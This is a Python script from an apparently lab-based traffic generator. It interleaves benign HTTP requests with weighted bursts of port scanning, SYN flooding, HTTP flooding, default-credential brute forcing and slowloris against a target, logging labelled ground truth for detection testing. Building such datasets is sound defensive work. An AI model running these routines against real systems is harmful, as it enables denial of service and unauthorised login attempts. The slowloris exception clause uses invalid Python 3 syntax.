"""Mixed traffic: interleaves normal HTTP requests with a rotating mix of
attack types (80% benign, 20% attack) on a randomized schedule.

Simulates a compromised host producing blended traffic with varied
attack patterns — not just one repeated technique.
"""

from __future__ import annotations

import os
import random
import signal
import socket
import sys
import time

import requests

sys.path.insert(
    0,
    os.path.dirname(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    ),
)

from lib.tests.packet_utils import build_syn_packet, send_raw_packet
from lib.tests.traffic_scheduler import TrafficJob, TrafficScheduler
from lib.tests.logger import GroundTruthLogger
from lib.tests.scenario_config import load_from_env, wait_for_target

RUNNING = True
ENDPOINTS = ["/", "/index.html", "/api/status", "/api/users", "/api/data"]
BENIGN_RATIO = 0.8
ATTACK_TYPES = [
    "port_scan",
    "syn_flood",
    "http_flood",
    "brute_force",
    "slowloris",
]
ATTACK_WEIGHTS = [0.25, 0.25, 0.25, 0.15, 0.10]
USERNAMES = ["admin", "root", "user", "test", "operator"]
PASSWORDS = ["password", "123456", "admin", "root", "letmein"]


def _shutdown(signum, frame):
    global RUNNING
    RUNNING = False


def benign_request(
    base_url: str, src_ip: str, target_ip: str, logger: GroundTruthLogger
) -> None:
    endpoint = random.choice(ENDPOINTS)
    try:
        requests.get(f"{base_url}{endpoint}", timeout=2)
    except requests.RequestException:
        pass
    logger.log(
        src_ip=src_ip,
        dst_ip=target_ip,
        dst_port=8080,
        label="benign",
        extra=f"endpoint={endpoint}",
    )


def port_scan_burst(
    base_url: str, src_ip: str, target_ip: str, logger: GroundTruthLogger
) -> None:
    count = random.randint(5, 20)
    for _ in range(count):
        port = random.randint(1, 1024)
        pkt = build_syn_packet(target_ip, port, src_ip=src_ip)
        send_raw_packet(pkt)
        logger.log(
            src_ip=src_ip,
            dst_ip=target_ip,
            dst_port=port,
            label="port_scan",
            extra="mode=mixed",
        )


def syn_flood_burst(
    base_url: str, src_ip: str, target_ip: str, logger: GroundTruthLogger
) -> None:
    count = random.randint(20, 80)
    for _ in range(count):
        pkt = build_syn_packet(target_ip, 8080, src_ip=src_ip)
        send_raw_packet(pkt)
    logger.log(
        src_ip=src_ip,
        dst_ip=target_ip,
        dst_port=8080,
        label="syn_flood",
        extra=f"mode=mixed,burst={count}",
    )


def http_flood_burst(
    base_url: str, src_ip: str, target_ip: str, logger: GroundTruthLogger
) -> None:
    count = random.randint(10, 40)
    for _ in range(count):
        endpoint = random.choice(ENDPOINTS)
        try:
            if random.random() < 0.7:
                requests.get(f"{base_url}{endpoint}", timeout=2)
            else:
                requests.post(
                    f"{base_url}/api/login",
                    json={"user": "test", "pass": "x"},
                    timeout=2,
                )
        except requests.RequestException:
            pass
        logger.log(
            src_ip=src_ip,
            dst_ip=target_ip,
            dst_port=8080,
            label="http_flood",
            extra=f"mode=mixed,endpoint={endpoint}",
        )


def brute_force_burst(
    base_url: str, src_ip: str, target_ip: str, logger: GroundTruthLogger
) -> None:
    count = random.randint(5, 15)
    for _ in range(count):
        user = random.choice(USERNAMES)
        pwd = random.choice(PASSWORDS)
        try:
            resp = requests.post(
                f"{base_url}/api/login",
                json={"user": user, "pass": pwd},
                timeout=2,
            )
            success = resp.status_code == 200
        except requests.RequestException:
            success = False
        logger.log(
            src_ip=src_ip,
            dst_ip=target_ip,
            dst_port=8080,
            label="brute_force",
            extra=f"mode=mixed,user={user},success={success}",
        )


def slowloris_burst(
    base_url: str, src_ip: str, target_ip: str, logger: GroundTruthLogger
) -> None:
    sockets: list[socket.socket] = []
    count = random.randint(3, 8)
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, 8080))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
            sockets.append(s)
        except socket.timeout, OSError:
            break
    # Hold connections open briefly, then send keep-alives
    time.sleep(1.0)
    for s in sockets:
        try:
            s.send(b"X-a: b\r\n")
        except OSError:
            pass
    time.sleep(1.0)
    for s in sockets:
        try:
            s.close()
        except OSError:
            pass
    logger.log(
        src_ip=src_ip,
        dst_ip=target_ip,
        dst_port=8080,
        label="slowloris",
        extra=f"mode=mixed,opened={len(sockets)}",
    )


ATTACK_DISPATCH = {
    "port_scan": port_scan_burst,
    "syn_flood": syn_flood_burst,
    "http_flood": http_flood_burst,
    "brute_force": brute_force_burst,
    "slowloris": slowloris_burst,
}


def attack_burst(
    base_url: str, src_ip: str, target_ip: str, logger: GroundTruthLogger
) -> None:
    """Pick a random attack type (weighted) and run a short burst."""
    attack = random.choices(ATTACK_TYPES, weights=ATTACK_WEIGHTS, k=1)[0]
    ATTACK_DISPATCH[attack](base_url, src_ip, target_ip, logger)


def main() -> None:
    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT, _shutdown)

    cfg = load_from_env()
    target_ip = cfg.target.ip
    attacker_ip = os.environ.get("ATTACKER_IP", "172.28.0.11")
    duration = cfg.duration
    intensity = cfg.intensity

    base_url = f"http://{target_ip}:8080"
    log_path = f"/app/logs/mixed_{attacker_ip}.csv"
    print(f"[mixed] Target: {base_url}, Attacker: {attacker_ip}")
    print(f"[mixed] Duration: {duration}s, Ratio: {BENIGN_RATIO:.0%} benign")
    print(f"[mixed] Attack mix: {dict(zip(ATTACK_TYPES, ATTACK_WEIGHTS))}")

    if not wait_for_target(target_ip, 8080):
        print("[mixed] ERROR: target not reachable, aborting.")
        return

    with GroundTruthLogger(log_path, scenario="mixed") as logger:
        scheduler = TrafficScheduler(duration=duration)

        benign_interval = 1.0 / max(intensity * BENIGN_RATIO, 0.1)
        attack_interval = 1.0 / max(intensity * (1 - BENIGN_RATIO), 0.1)

        scheduler.add_job(
            TrafficJob(
                name="benign",
                func=benign_request,
                args=(base_url, attacker_ip, target_ip, logger),
                interval=benign_interval,
                weight=BENIGN_RATIO,
            )
        )
        scheduler.add_job(
            TrafficJob(
                name="attack",
                func=attack_burst,
                args=(base_url, attacker_ip, target_ip, logger),
                interval=attack_interval,
                weight=1 - BENIGN_RATIO,
            )
        )

        scheduler.run()

    print("[mixed] Completed.")


if __name__ == "__main__":
    main()
